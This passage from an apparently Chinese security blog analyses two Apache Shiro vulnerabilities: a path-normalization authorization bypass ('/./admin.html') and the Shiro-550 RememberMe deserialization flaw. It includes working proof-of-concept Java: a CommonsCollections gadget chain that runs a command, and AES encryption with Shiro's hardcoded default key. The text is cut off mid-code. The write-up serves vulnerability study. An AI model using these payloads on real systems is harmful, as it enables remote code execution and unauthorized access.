bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>UserController<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doLogin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doLoginPage</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password, <span class="meta">@RequestParam(name=&quot;rememberme&quot;, defaultValue=&quot;&quot;)</span> String rememberMe)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ShiroUtil.login(username, password))&#123;</span><br><span class="line">            <span class="keyword">if</span>(ShiroUtil.hasRole(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/admin.html&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ShiroUtil.hasRole(<span class="string">&quot;user&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/user.html&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/unauth.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value=&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">helloPage</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/login.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>影响版本：shiro &lt; 1.1.0</p><p>shiro 使用<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()</code>方法获取和调用执行的<code>filter</code><br><img src="/2021/11/10/CVE-2010-3863/image-20221017161045663.png" alt="image-20221017161045663"></p><p>在上图中可以看到，通过<code>getPathWithinApplication()</code>方法获取到我们传入的请求路径<code>/./admin.html</code>，接着通过<code>filterChainManager.getChainNames()</code>方法取出我们的配置<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[/admin.html, /user.html, /**]</span><br></pre></td></tr></table></figure></p><p>我们这里跟进一下<code>getPathWithinApplication()</code>方法<br><img src="/2021/11/10/CVE-2010-3863/image-20221017161803921.png" alt="image-20221017161803921"></p><p>继续跟进<code>getPathWithinApplication()</code>方法<br><img src="/2021/11/10/CVE-2010-3863/image-20221017161912839.png" alt="image-20221017161912839"></p><p>在<code>getRequestUri()</code>方法中返回了<code>/./admin.html</code>，继续跟进<code>getRequestUri()</code>方法<br><img src="/2021/11/10/CVE-2010-3863/image-20221017162105007.png" alt="image-20221017162105007"></p><p>最后会 return 到<code>decodeAndCleanUriString()</code>方法，继续跟进该方法<br><img src="/2021/11/10/CVE-2010-3863/image-20221017162648547.png" alt="image-20221017162648547"></p><p>首先对 URL 进行 URL 解码，并对<code>;</code>进行截取，查了一下</p><blockquote><p><code>decodeAndCleanUriString()</code> 是 URL Decode 及针对 JBoss/Jetty 等中间件在 url 处添加 <code>;jsessionid</code> 之类的字符串的适配，对 <code>;</code> 进行了截取。</p></blockquote><p>接下来<code>getChain()</code>方法往下走进行<code>while</code>循环，通过<code>pathMatches()-&gt;pathMatcher.matches()</code>方法进行匹配<br><img src="/2021/11/10/CVE-2010-3863/image-20221017164449628.png" alt="image-20221017164449628"></p><p>通过前面对请求处理的跟踪，可以发现在匹配之前没有对传进来的<code>URL</code>进行标准化路径处理，如果构造一下请求路径就有可能绕过权限校验。</p><p>回顾一下，我们的配置如下所示，设置<code>admin.html</code>文件只有<code>amdin</code>用户角色才能访问，同时设置<code>/**</code>为<code>anon</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>访问<code>admin.html</code>，因为没有<code>admin</code>权限，校验失败故 302 跳转到了<code>login.html</code><br><img src="/2021/11/10/CVE-2010-3863/image-20221017114715110.png" alt="image-20221017114715110"></p><p>访问<code>/./admin.html</code>或者<code>/aa/../admin.html</code>，在<code>while</code>循环中，与前面的<code>/admin.html</code>和<code>/user.html</code>匹配失败，进而进入了<code>/**</code>的匹配范围，成功访问到<code>admin.html</code>文件<br><img src="/2021/11/10/CVE-2010-3863/image-20221017114807826.png" alt="image-20221017114807826"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-4437漏洞分析</title>
      <link href="/2021/11/10/CVE-2016-4437/"/>
      <url>/2021/11/10/CVE-2016-4437/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2016-4437漏洞分析"><a href="#CVE-2016-4437漏洞分析" class="headerlink" title="CVE-2016-4437漏洞分析"></a>CVE-2016-4437漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。</p><p>影响版本：Shiro  &lt; 1.2.5</p><p>漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Shiro 在 0.9 版本开始提供 RememberMe 模块，用于应用程序记录登录用户凭证的功能。</p><h3 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h3><p><code>org.apache.shiro.mgt.RememberMeManager</code>接口提供了以下五个方法：</p><ul><li><code>getRememberedPrincipals()</code>：RememberMe 的功能，在指定上下文中寻找记录的<code>principals</code>。</li><li><code>forgetIdentity()</code>：忘记用户身份标识。</li><li><code>onSuccessfulLogin()</code>：登录校验成功时调用，保存当前用户的<code>principals</code>以供应用程序以后调用。</li><li><code>onFailedLogin()</code>：登录校验失败时调用，忘记当前用户的<code>principals</code>。</li><li><code>onLogout()</code>：用户退出登录时调用，忘记当前用户的<code>principals</code>。</li></ul><h3 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h3><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code>是实现<code>RememberMeManger</code>接口类的抽象类，这里有几个比较重要的成员变量需要了解：</p><ul><li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量（encryptionCipherKey/decryptionCipherKey）。</li><li><code>serializer</code>：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的<code>PrincipalCollection</code>对象。</li><li><code>cipherService</code>：用于数据加解密的类，实际上是<code>org.apache.shiro.crypto.AesCipherService</code>类。</li></ul><h3 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h3><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类在 Shiro 中实现使用 Cookie 记录用户身份信息的功能，比较值得关注的方法为<code>getRememberedSerializedIdentity()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext)subjectContext;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isIdentityRemoved(wsc)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> <span class="built_in">this</span>.getCookie().readValue(request, response);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;deleteMe&quot;</span>.equals(base64)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    base64 = <span class="built_in">this</span>.ensurePadding(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> decoded;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在该方法中，主要实现了获取 Cookie 中的内容并通过 Base64 解码，然后返回 byte 数组的功能。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞环境已经上传到 github 中：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a></p><p>先简单了解一下该漏洞的原理：</p><p>当用户登录勾选<code>remember me</code>的时候，Shiro 会将当前用户的 Cookie 信息序列化后进行 AES 加密存储在 Cookie 的 RememberMe 字段中，在下次请求时会读取 Cookie 中的 RememberMe 字段并进行 AES 解密然后反序列化。<br><img src="/2021/11/10/CVE-2016-4437/image-20221018155429239.png" alt="image-20221018155429239"></p><p>然而通过前面的<code>AbstractRememberMeManager</code>类我们知道，AES 加解密的 KEY 是硬编码在该类中的，因此当我们知道 KEY之后，可以伪造 RememberMe 字段进而触发反序列化漏洞。</p><p>那么我们便开始一步步跟着调试吧，打上断点，在 Cookie 添加 RememberMe 字段然后发送请求。</p><p>在<code>#getRememberedPrincipals()</code>方法中将上下文数据传入到<code>getRememberedSerializedIdentity()</code>方法中<br><img src="/2021/11/10/CVE-2016-4437/image-20221018111741540.png" alt="image-20221018111741540"></p><p>接着会跳转到<code>CookieRememberMeManager#getRememberedSerializedIdentity()</code>方法中<br><img src="/2021/11/10/CVE-2016-4437/image-20221018155851444.png" alt="image-20221018155851444"></p><p>可以看到<code>readValue()</code>方法会从请求中获取<code>RememberMe</code>字段的值，最后通过<code>Base64.decode()</code>解码后返回 byte 数组，接着又回到<code>getRememberedPrincipals()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221018160049461.png" alt="image-20221018160049461"></p><p>继续跟进<code>convertBytesToPrincipals()</code>方法，调用<code>decrypt()</code>方法进行解密<br><img src="/2021/11/10/CVE-2016-4437/image-20221018160159474.png" alt="image-20221018160159474"></p><p>继续跟进<code>decrypt()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221018160308176.png" alt="image-20221018160308176"></p><p>这里调用到<code>getDecryptionCipherKey()</code>方法，我们跟进一下<br><img src="/2021/11/10/CVE-2016-4437/image-20221018162044495.png" alt="image-20221018162044495"></p><p>这里到了<code>AbstractRememberMeManager#getDecryptionCipherKey()</code>方法，前面我们提到过该类，在这里获取到了硬编码的秘钥。</p><p>接着<code>decrypt()</code>方法走完 return 了<code>serialized</code>字节数组，最后调用了<code>deserialize()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221018162427231.png" alt="image-20221018162427231"></p><p>继续跟进<code>deserialize()</code>方法，跟着调用了<code>getSerializer().deserialize()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221018162530315.png" alt="image-20221018162530315"></p><p>继续跟进<code>getSerializer().deserialize()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221018162715157.png" alt="image-20221018162715157"></p><p>可以看到，这里通过<code>ByteArrayInputStream()</code>获取了输入流，最后调用<code>readObject()</code>方法进行反序列化。</p><p>回顾梳理一下流程：</p><ol><li>传入<code>RememberMe</code>字段，获取该字段的值；</li><li>对<code>RememberMe</code>进行 Base64 解码，然后调用硬编码的 KEY 进行解密；</li><li>对解密后的内容进行反序列化。</li></ol><h2 id="编写-POC"><a href="#编写-POC" class="headerlink" title="编写 POC"></a>编写 POC</h2><p>在 pom.xml 文件里添加了<code>CommonCollections</code>和<code>javassist</code>依赖，以完成反序列化的利用演示。<br><img src="/2021/11/10/CVE-2016-4437/image-20221018163306620.png" alt="image-20221018163306620"></p><p>这里通过前面我们学习的<code>CommonsCollections11</code>链子生成恶意文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据对应的<code>AbstractRememberMeManager#encrypt()</code>方法编写加密<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = 